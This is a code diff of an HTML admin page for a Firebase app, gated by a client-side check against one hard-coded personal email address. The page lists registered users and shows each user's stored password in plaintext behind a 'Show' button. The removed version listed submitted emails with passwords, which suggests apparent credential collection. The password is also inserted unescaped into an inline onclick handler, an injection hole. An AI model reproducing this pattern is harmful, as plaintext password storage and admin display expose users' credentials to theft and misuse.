@@ -13,6 +13,8 @@ th{background:#8e24aa;}
 tr:hover{background:#333;}
 .back-btn{padding:8px 15px;border:none;border-radius:5px;background:#555;color:#fff;cursor:pointer;margin-bottom:20px;}
 .back-btn:hover{background:#777;}
+button.show-pass{padding:5px 10px;border:none;border-radius:5px;background:#8e24aa;color:#fff;cursor:pointer;}
+button.show-pass:hover{background:#6a1b9a;}
 .no-data{color:#888;text-align:center;}
 </style>
 </head>
@@ -24,17 +26,16 @@ tr:hover{background:#333;}
 <h2>Registered Users</h2>
 <table>
 <thead>
-<tr><th>Email</th><th>Points</th><th>Badges</th><th>Signup Date</th></tr>
+<tr>
+  <th>Email</th>
+  <th>Last Online</th>
+  <th>Created At</th>
+  <th>Banned</th>
+  <th>Ban Timeout</th>
+  <th>Password</th>
+</tr>
 </thead>
-<tbody id="userList"><tr><td colspan="4" class="no-data">Loading...</td></tr></tbody>
-</table>
-
-<h2>User Submitted Information</h2>
-<table>
-<thead>
-<tr><th>Email</th><th>Password</th><th>Submitted At</th></tr>
-</thead>
-<tbody id="submissionList"><tr><td colspan="3" class="no-data">Loading...</td></tr></tbody>
+<tbody id="userList"><tr><td colspan="6" class="no-data">Loading...</td></tr></tbody>
 </table>
 
 <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
@@ -56,13 +57,12 @@ if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
 const auth = firebase.auth();
 const db = firebase.firestore();
 
-// Only admin can access
+// Only admin email can access
 auth.onAuthStateChanged(user=>{
   if(!user || user.email!=="abdullahyt4622@gmail.com"){
     window.location.href="index.html";
   } else {
     loadUsers();
-    loadSubmissions();
   }
 });
 
@@ -72,51 +72,40 @@ function loadUsers(){
     const tbody = document.getElementById("userList");
     tbody.innerHTML="";
     if(snapshot.empty){
-      tbody.innerHTML='<tr><td colspan="4" class="no-data">No users found</td></tr>';
+      tbody.innerHTML='<tr><td colspan="6" class="no-data">No users found</td></tr>';
       return;
     }
+
     snapshot.forEach(doc=>{
       const data = doc.data();
-      const createdAt = data.createdAt ? (data.createdAt.toDate().toLocaleString()) : "N/A";
+      const lastOnline = data.lastOnline ? data.lastOnline.toDate().toLocaleString() : "N/A";
+      const createdAt = data.createdAt ? data.createdAt.toDate().toLocaleString() : "N/A";
+      const banned = data.banned ? "Yes" : "No";
+      const banTimeout = data.banTimeout ? data.banTimeout.toDate().toLocaleString() : "-";
+      const password = data.password || "";
+
       const tr = document.createElement("tr");
-      tr.innerHTML = `<td>${data.email || 'N/A'}</td>
-                      <td>${data.points || 0}</td>
-                      <td>${data.badges || 0}</td>
-                      <td>${createdAt}</td>`;
+      tr.innerHTML = `
+        <td>${data.email || 'N/A'}</td>
+        <td>${lastOnline}</td>
+        <td>${createdAt}</td>
+        <td>${banned}</td>
+        <td>${banTimeout}</td>
+        <td><button class="show-pass" onclick="togglePassword(this,'${password}')">Show</button></td>
+      `;
       tbody.appendChild(tr);
     });
   })
   .catch(err=>{
     console.error("Error loading users:", err);
     const tbody = document.getElementById("userList");
-    tbody.innerHTML='<tr><td colspan="4" class="no-data">Error loading users</td></tr>';
+    tbody.innerHTML='<tr><td colspan="6" class="no-data">Error loading users</td></tr>';
   });
 }
 
-function loadSubmissions(){
-  db.collection("submissions").orderBy("submittedAt","desc").get()
-  .then(snapshot=>{
-    const tbody = document.getElementById("submissionList");
-    tbody.innerHTML="";
-    if(snapshot.empty){
-      tbody.innerHTML='<tr><td colspan="3" class="no-data">No submissions found</td></tr>';
-      return;
-    }
-    snapshot.forEach(doc=>{
-      const data = doc.data();
-      const submittedAt = data.submittedAt ? (data.submittedAt.toDate().toLocaleString()) : "N/A";
-      const tr = document.createElement("tr");
-      tr.innerHTML = `<td>${data.email || 'N/A'}</td>
-                      <td>${data.password || 'N/A'}</td>
-                      <td>${submittedAt}</td>`;
-      tbody.appendChild(tr);
-    });
-  })
-  .catch(err=>{
-    console.error("Error loading submissions:", err);
-    const tbody = document.getElementById("submissionList");
-    tbody.innerHTML='<tr><td colspan="3" class="no-data">Error loading submissions</td></tr>';
-  });
+function togglePassword(btn, pass){
+  if(btn.textContent === "Show") btn.textContent = pass;
+  else btn.textContent = "Show";
 }
 
 function goBack(){ window.location.href="index.html"; }
